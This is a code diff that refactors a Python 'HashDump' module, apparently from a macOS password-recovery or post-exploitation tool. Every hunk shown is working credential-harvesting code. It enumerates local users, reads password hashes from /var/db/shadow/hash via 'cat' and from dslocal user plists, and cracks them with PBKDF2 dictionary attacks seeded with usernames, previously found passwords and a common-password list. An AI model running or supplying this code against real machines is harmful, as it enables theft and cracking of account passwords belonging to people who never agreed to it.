@@ -53,27 +53,24 @@ class HashDump(ModuleInfo):
     def run_cmd(self, cmd):
         p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
         result, _ = p.communicate()
-        if result:
-            return result
-        else:
-            return ''
+        return result if result else ''
 
     def list_users(self):
         users_dir = '/Users'
         users_list = []
         if os.path.exists(users_dir):
-            for user in os.listdir(users_dir):
-                if user != 'Shared' and not user.startswith('.'):
-                    users_list.append(user)
-
+            users_list.extend(
+                user
+                for user in os.listdir(users_dir)
+                if user != 'Shared' and not user.startswith('.')
+            )
         return users_list
 
     # works for all version (< 10.8)
     def get_hash_using_guid(self, guid):
-        cmd = 'cat /var/db/shadow/hash/%s' % guid
-        hash = self.run_cmd(cmd)
-        if hash:
-            self.info('Full hash found : %s ' % hash)
+        cmd = f'cat /var/db/shadow/hash/{guid}'
+        if hash := self.run_cmd(cmd):
+            self.info(f'Full hash found : {hash} ')
             # Salted sha1: hash[104:152]
             # Zero salted sha1: hash[168:216]
             # NTLM: hash[64:]
@@ -85,14 +82,11 @@ class HashDump(ModuleInfo):
     def get_user_hash_using_niutil(self, username):
         # get guid
         cmd = 'niutil -readprop . /users/{username} generateduid'.format(username=username)
-        guid = self.run_cmd(cmd)
-        if guid:
+        if guid := self.run_cmd(cmd):
             guid = guid.strip()
             self.info('GUID found : {guid}'.format(guid=guid))
 
-            # get hash
-            hash_ = self.get_hash_using_guid(guid)
-            if hash_:
+            if hash_ := self.get_hash_using_guid(guid):
                 return username, hash_
 
         return False
@@ -101,14 +95,11 @@ class HashDump(ModuleInfo):
     def get_user_hash_using_dscl(self, username):
         # get guid
         cmd = 'dscl localhost -read /Search/Users/{username} | grep GeneratedUID | cut -c15-'.format(username=username)
-        guid = self.run_cmd(cmd)
-        if guid:
+        if guid := self.run_cmd(cmd):
             guid = guid.strip()
             self.info('GUID found : {guid}'.format(guid=guid))
 
-            # get hash
-            hash_ = self.get_hash_using_guid(guid)
-            if hash_:
+            if hash_ := self.get_hash_using_guid(guid):
                 return username, hash_
 
         return False
@@ -155,7 +146,7 @@ class HashDump(ModuleInfo):
             if pbkdf2:
                 self.info('Dictionary attack started !')
                 for word in dic:
-                    self.info('Trying word: %s' % word)
+                    self.info(f'Trying word: {word}')
                     if str(self.entropy_hex) == str(
                             self.dictionary_attack_pbkdf2(str(word), binascii.unhexlify(self.salt_hex),
                                                           self.iterations)):
@@ -177,8 +168,7 @@ class HashDump(ModuleInfo):
     # System passwords are stored using pbkdf2 algorithm
     def dictionary_attack_pbkdf2(self, password, salt, iterations):
         hex = hashlib.pbkdf2_hmac('sha512', password, salt, iterations, 128)
-        password_hash = binascii.hexlify(hex)
-        return password_hash
+        return binascii.hexlify(hex)
 
     # ------------------------------- End of Dictionary attack -------------------------------
 
@@ -187,42 +177,38 @@ class HashDump(ModuleInfo):
 
         if self.root_access():
             major, minor = self.check_version()
-            if major == 10 and (minor == 3 or minor == 4):
+            if major == 10 and minor in [3, 4]:
                 for user in self.list_users():
                     self.info('User found: {user}'.format(user=user))
-                    user_hash = self.get_user_hash_using_niutil(user)
-                    if user_hash:
+                    if user_hash := self.get_user_hash_using_niutil(user):
                         user_hashes.append(user_hash)
 
-            if major == 10 and (minor == 5 or minor == 6):
-                for user in self.list_users():
-                    self.info('User found: {user}'.format(user=user))
-                    user_hash = self.get_user_hash_using_dscl(user)
-                    if user_hash:
-                        user_hashes.append(user_hash)
+            if major == 10:
+                if minor in [5, 6]:
+                    for user in self.list_users():
+                        self.info('User found: {user}'.format(user=user))
+                        if user_hash := self.get_user_hash_using_dscl(user):
+                            user_hashes.append(user_hash)
 
-            # TO DO: manage version 10.7
+                elif minor >= 8:
+                    user_names = [plist.split(".")[0] for plist in os.listdir(u'/var/db/dslocal/nodes/Default/users/') if not plist.startswith(u'_')]
+                    for username in user_names:
+                        if user_hash := self.get_user_hash_from_plist(username):
+                            user_hashes.append(user_hash)
 
-            elif major == 10 and minor >= 8:
-                user_names = [plist.split(".")[0] for plist in os.listdir(u'/var/db/dslocal/nodes/Default/users/') if not plist.startswith(u'_')]
-                for username in user_names:
-                    user_hash = self.get_user_hash_from_plist(username)
-                    if user_hash:
-                        user_hashes.append(user_hash)
+                            # try to get the password in clear text
 
-                        # try to get the password in clear text
+                            passwords = constant.passwordFound  # check if previous passwords are used as system password
+                            passwords.insert(0, username)  # check for weak password (login equal password)
+                            if constant.user_password:
+                                passwords.insert(0, constant.user_password)
 
-                        passwords = constant.passwordFound  # check if previous passwords are used as system password
-                        passwords.insert(0, username)  # check for weak password (login equal password)
-                        if constant.user_password:
-                            passwords.insert(0, constant.user_password)
+                            found = self.dictionary_attack(username, passwords)
 
-                        found = self.dictionary_attack(username, passwords)
-
-                        # realize a dictionary attack using the 500 most famous passwords
-                        if constant.dictionary_attack and not found:
-                            dic = get_dic()
-                            dic.insert(0, self.username)
-                            self.dictionary_attack(username, dic)
+                            # realize a dictionary attack using the 500 most famous passwords
+                            if constant.dictionary_attack and not found:
+                                dic = get_dic()
+                                dic.insert(0, self.username)
+                                self.dictionary_attack(username, dic)
 
         return ['__SYSTEM__', user_hashes]
